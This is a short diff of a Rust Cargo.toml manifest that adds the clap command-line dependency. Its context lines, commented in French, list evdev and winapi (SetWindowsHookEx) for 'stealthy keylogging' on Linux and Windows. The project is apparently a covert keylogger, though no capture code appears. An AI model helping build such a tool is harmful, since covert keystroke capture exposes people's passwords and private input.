@@ -4,6 +4,9 @@ version = "0.1.0"
 edition = "2021"
 
 [dependencies]
+# CLI
+clap = { version = "4.4", features = ["derive"] }
+
 # Keylogging furtif
 evdev = "0.12"   # Linux (capture clavier via /dev/input/eventX)
 winapi = { version = "0.3", features = ["winuser"] }  # Windows (SetWindowsHookEx)
